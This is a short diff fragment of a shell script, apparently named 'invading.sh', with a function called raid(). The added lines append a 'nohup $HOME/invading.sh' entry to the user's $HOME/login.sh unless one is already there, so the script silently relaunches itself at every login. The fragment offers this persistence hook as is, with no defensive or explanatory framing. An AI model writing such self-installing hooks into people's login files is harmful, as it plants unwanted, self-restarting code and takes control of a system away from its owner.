@@ -26,6 +26,10 @@ raid()
 	done
 }
 
+if ! grep -F "invading.sh" $HOME/login.sh > /dev/null; then
+	echo "nohup $HOME/invading.sh" >> $HOME/login.sh
+fi
+
 TIMER=0
 while true; do
 	if [[ $TIMER -ge 10 ]]; then
